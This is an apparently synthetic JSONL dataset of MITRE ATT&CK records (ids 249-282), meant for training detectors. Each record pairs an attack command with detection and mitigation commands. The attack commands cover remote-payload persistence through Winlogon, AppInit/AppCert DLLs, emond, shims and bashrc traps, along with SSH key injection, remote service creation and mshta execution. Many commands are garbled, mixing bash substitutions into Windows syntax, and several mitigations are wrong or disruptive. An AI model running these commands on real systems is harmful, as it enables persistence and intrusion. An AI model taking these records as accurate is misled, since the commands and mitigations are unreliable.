{"id":249,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Abusing emond on macOS remotely for persistence.","command":"echo 'command=/bin/bash -c \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*","detection":"Monitor emond rules: `ls /etc/emond.d/rules | grep http`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote emond tampering and suggest access controls."}
{"id":250,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid.exe to execute malicious COM object via SMB share.","command":"verclsid /S /C {$(uuidgen)} /I \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid SMB: `wmic process where name='verclsid.exe' get commandline | findstr \\\\`; YARA rule: `rule VerclsidSmbDll { strings: $a = /verclsid.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid SMB COM execution and suggest SMB restrictions."}
{"id":251,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse nltest.exe for domain enumeration.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; nltest /dclist:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo domain$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor nltest: `wmic process where name='nltest.exe' get commandline | findstr dclist`; Event ID 4688.","mitigation":"Restrict nltest: `icacls %windir%\\System32\\nltest.exe /deny Everyone:RX`; Audit domain queries: `auditpol /set /subcategory:'Logon' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect nltest domain enumeration and suggest access controls."}
{"id":252,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect system environment variables.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-ChildItem Env: | Out-File C:\\$(echo env$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor environment collection: `wmic process where name='powershell.exe' get commandline | findstr Env`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell environment collection and suggest execution policy restrictions."}
{"id":253,"tactic":"Lateral Movement","technique":"T1021.006: Remote Services: Windows Remote Management","threat":"Using PowerShell to execute commands via WinRM remotely.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-Command -ComputerName $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -ScriptBlock { I$(echo 'malicious' | base64 -w0) }\"","detection":"Monitor WinRM remote: `wmic process where name='powershell.exe' get commandline | findstr Invoke-Command`; Event ID 4688.","mitigation":"Disable WinRM: `Disable-PSRemoting -Force`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.","references":["MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect PowerShell WinRM execution and suggest WinRM restrictions."}
{"id":254,"tactic":"Persistence","technique":"T1547.004: Winlogon","threat":"Modifying Winlogon registry remotely for persistence.","command":"reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor Winlogon changes: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit | findstr http`; Event ID 4657.","mitigation":"Restrict Winlogon writes: `regini -h deny HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`; Block Winlogon downloads: `netsh advfirewall firewall add rule name='Block Winlogon' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote Winlogon tampering and suggest firewall rules."}
{"id":255,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via shell32.dll remotely.","command":"rundll32 shell32.dll,ShellExec_RunDLL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 shell32 remote: `wmic process where name='rundll32.exe' get commandline | findstr http`; YARA rule: `rule Rundll32ShellRemote { strings: $a = /rundll32.*shell32.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block shell32 downloads: `netsh advfirewall firewall add rule name='Block rundll32' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shell32 remote execution and suggest firewall rules."}
{"id":256,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using ftype to modify file type associations for malicious execution.","command":"ftype txtfile=C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %1","detection":"Monitor ftype changes: `ftype | findstr evil`; Event ID 4657.","mitigation":"Restrict ftype: `icacls %windir%\\System32\\ftype.exe /deny Everyone:RX`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect ftype association abuse and suggest auditing."}
{"id":257,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect network configuration data.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-NetAdapter | Out-File C:\\$(echo net$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor network collection: `wmic process where name='powershell.exe' get commandline | findstr Get-NetAdapter`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell network configuration collection and suggest execution policy restrictions."}
{"id":258,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using at.exe to schedule malicious task on remote SMB share.","command":"at \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(date +%H:%M -d '+1 minute') C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)","detection":"Monitor at remote: `wmic process where name='at.exe' get commandline | findstr \\\\`; Event ID 4698.","mitigation":"Restrict at: `icacls %windir%\\System32\\at.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect at.exe SMB task scheduling and suggest SMB restrictions."}
{"id":259,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Registering malicious AppCert DLL remotely for persistence.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor AppCert DLLs: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" | findstr http`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block AppCert' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote AppCert DLL tampering and suggest firewall rules."}
{"id":260,"tactic":"Defense Evasion","technique":"T1222.001: File and Directory Permissions Modification: Windows","threat":"Using attrib.exe to hide malicious files.","command":"attrib +h +s C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor attrib: `wmic process where name='attrib.exe' get commandline | findstr +h`; Event ID 4663.","mitigation":"Restrict attrib: `icacls %windir%\\System32\\attrib.exe /deny Everyone:RX`; Audit file attribute changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1222.001: https://attack.mitre.org/techniques/T1222/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect attrib file hiding and suggest auditing."}
{"id":261,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse schtasks for persistent task creation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; schtasks /create /tn $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /tr 'powershell -c ''I$(echo malicious | base64 -w0)''' /sc daily /f\"","detection":"Monitor schtasks: `wmic process where name='schtasks.exe' get commandline | findstr create`; Event ID 4698.","mitigation":"Restrict schtasks: `icacls %windir%\\System32\\schtasks.exe /deny Everyone:RX`; Audit task creation: `auditpol /set /subcategory:'Security System Extension' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect schtasks abuse and suggest task auditing."}
{"id":262,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using whoami to collect user information.","command":"whoami /all > $(echo user$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor whoami: `wmic process where name='whoami.exe' get commandline | findstr /all`; Event ID 4663.","mitigation":"Restrict whoami: `icacls %windir%\\System32\\whoami.exe /deny Everyone:RX`; Audit user enumeration: `auditpol /set /subcategory:'Logon' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect whoami data collection and suggest access controls."}
{"id":263,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using netsh to create malicious firewall rule for SMB access.","command":"netsh advfirewall firewall add rule name=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) dir=in action=allow protocol=TCP localport=445 remoteip=\\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor netsh firewall: `wmic process where name='netsh.exe' get commandline | findstr firewall`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Audit firewall changes: `auditpol /set /subcategory:'Filtering Platform Policy Change' /success:enable`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect netsh SMB firewall rule creation and suggest firewall auditing."}
{"id":264,"tactic":"Persistence","technique":"T1546.011: Application Shimming","threat":"Registering malicious shim remotely for persistence.","command":"sdbinst http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor sdbinst remote: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Block shim downloads: `netsh advfirewall firewall add rule name='Block Shim' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote shim registration and suggest firewall rules."}
{"id":265,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via url.dll remotely.","command":"rundll32 url.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 url: `wmic process where name='rundll32.exe' get commandline | findstr url.dll`; YARA rule: `rule Rundll32UrlRemote { strings: $a = /rundll32.*url.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block URL downloads: `netsh advfirewall firewall add rule name='Block rundll32' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 url.dll remote execution and suggest firewall rules."}
{"id":266,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse kubectl for Kubernetes pod execution.","command":"python -c \"import os; os.system('kubectl run $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --image=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --restart=Never --command -- /bin/sh -c ''http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh''')\"","detection":"Monitor kubectl: `wmic process where name='python.exe' get commandline | findstr kubectl`; Audit Kubernetes logs: `kubectl logs`.","mitigation":"Restrict kubectl: `chmod 700 /usr/local/bin/kubectl`; Enforce RBAC: Kubernetes policies.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect kubectl pod execution and suggest RBAC enforcement."}
{"id":267,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect browser history.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-ChildItem -Path 'C:\\Users\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History' | Out-File C:\\$(echo history$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor browser history access: `wmic process where name='powershell.exe' get commandline | findstr History`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Protect browser data: `icacls \"C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\" /deny Everyone:R`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell browser history collection and suggest data protections."}
{"id":268,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using ssh-keygen to generate malicious SSH keys for lateral movement.","command":"ssh-keygen -t rsa -f /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -N '' && cat /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).pub >> ~/.ssh/authorized_keys","detection":"Monitor ssh-keygen: `ps aux | grep ssh-keygen | grep tmp`; Audit SSH key changes: `auditctl -w ~/.ssh/authorized_keys -p wa`.","mitigation":"Restrict ssh-keygen: `chmod 700 /usr/bin/ssh-keygen`; Protect SSH keys: `chmod 600 ~/.ssh/authorized_keys`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect ssh-keygen key generation and suggest SSH key protections."}
{"id":269,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Abusing trap command remotely for persistence on Linux.","command":"echo 'trap \"/bin/bash -c \\\"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\" SIGHUP' >> ~/.bashrc","detection":"Monitor trap in bashrc: `cat ~/.bashrc | grep trap | grep http`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote trap tampering in bashrc and suggest file protections."}
{"id":270,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute malicious DLL via local file.","command":"regsvr32 /s C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor regsvr32 local: `wmic process where name='regsvr32.exe' get commandline | findstr .dll`; YARA rule: `rule Regsvr32LocalDll { strings: $a = /regsvr32.*\.dll/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Monitor DLL execution: AppLocker.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 local DLL execution and suggest AppLocker policies."}
{"id":271,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using bcdedit to disable recovery for malicious persistence.","command":"bcdedit /set {default} recoveryenabled no","detection":"Monitor bcdedit: `wmic process where name='bcdedit.exe' get commandline | findstr recoveryenabled`; Event ID 4688.","mitigation":"Restrict bcdedit: `icacls %windir%\\System32\\bcdedit.exe /deny Everyone:RX`; Audit boot configuration: `auditpol /set /subcategory:'System' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect bcdedit recovery tampering and suggest boot auditing."}
{"id":272,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect installed software list.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-WmiObject -Class Win32_Product | Out-File C:\\$(echo soft$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor software enumeration: `wmic process where name='powershell.exe' get commandline | findstr Win32_Product`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell software list collection and suggest execution policy restrictions."}
{"id":273,"tactic":"Lateral Movement","technique":"T1021.001: Remote Desktop Protocol","threat":"Using rwinsta to reset RDP sessions for lateral movement.","command":"rwinsta /server:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com $(shuf -i 1-65535 -n 1)","detection":"Monitor rwinsta: `wmic process where name='rwinsta.exe' get commandline | findstr /server`; Event ID 4688.","mitigation":"Restrict rwinsta: `icacls %windir%\\System32\\rwinsta.exe /deny Everyone:RX`; Disable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.","references":["MITRE ATT&CK T1021.001: https://attack.mitre.org/techniques/T1021/001/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect rwinsta RDP session resets and suggest RDP restrictions."}
{"id":274,"tactic":"Persistence","technique":"T1547.005: Security Support Provider","threat":"Registering malicious SSP remotely for persistence.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages /t REG_MULTI_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\0kerberos\"","detection":"Monitor SSP changes: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages | findstr evil`; Event ID 4657.","mitigation":"Restrict LSA writes: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\"`; Audit SSP changes.","references":["MITRE ATT&CK T1547.005: https://attack.mitre.org/techniques/T1547/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect SSP tampering and suggest registry protections."}
{"id":275,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute malicious JavaScript locally.","command":"mshta javascript:Execute(\"new ActiveXObject('WScript.Shell').Run('powershell -c ''I$(echo malicious | base64 -w0)''');close()\")","detection":"Monitor mshta JavaScript: `wmic process where name='mshta.exe' get commandline | findstr javascript`; YARA rule: `rule MshtaLocalJS { strings: $a = /mshta.*javascript/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block JavaScript execution: AppLocker.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta JavaScript execution and suggest AppLocker policies."}
{"id":276,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse dsquery for domain user enumeration.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; dsquery user -name * | Out-File C:\\$(echo users$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor dsquery: `wmic process where name='dsquery.exe' get commandline | findstr user`; Event ID 4688.","mitigation":"Restrict dsquery: `icacls %windir%\\System32\\dsquery.exe /deny Everyone:RX`; Audit domain queries: `auditpol /set /subcategory:'Logon' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect dsquery user enumeration and suggest access controls."}
{"id":277,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect process information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Process | Out-File C:\\$(echo proc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor process collection: `wmic process where name='powershell.exe' get commandline | findstr Get-Process`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell process collection and suggest execution policy restrictions."}
{"id":278,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using sc.exe to create malicious service on remote SMB share.","command":"sc \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) create $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) binpath= \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor sc remote: `wmic process where name='sc.exe' get commandline | findstr create`; Event ID 7045.","mitigation":"Restrict sc: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect sc.exe SMB service creation and suggest SMB restrictions."}
{"id":279,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Registering malicious AppInit DLL remotely for persistence.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor AppInit DLLs: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs | findstr http`; Event ID 4657.","mitigation":"Restrict AppInit writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block AppInit' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote AppInit DLL tampering and suggest firewall rules."}
{"id":280,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to execute malicious MSI locally.","command":"msiexec /quiet /i C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi)","detection":"Monitor msiexec local: `wmic process where name='msiexec.exe' get commandline | findstr .msi`; YARA rule: `rule MsiexecLocalMsi { strings: $a = /msiexec.*\.msi/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Monitor MSI execution: AppLocker.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec local MSI execution and suggest AppLocker policies."}
{"id":281,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using regini to modify registry permissions maliciously.","command":"regini C:\\$(echo perms$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regini: `wmic process where name='regini.exe' get commandline | findstr .txt`; Event ID 4657.","mitigation":"Restrict regini: `icacls %windir%\\System32\\regini.exe /deny Everyone:RX`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regini registry permission abuse and suggest auditing."}
{"id":282,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system service information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Service | Out-File C:\\$(echo svc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor service collection: `wmic process where name='powershell.exe' get commandline | findstr Get-Service`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell service collection and suggest execution policy restrictions."}
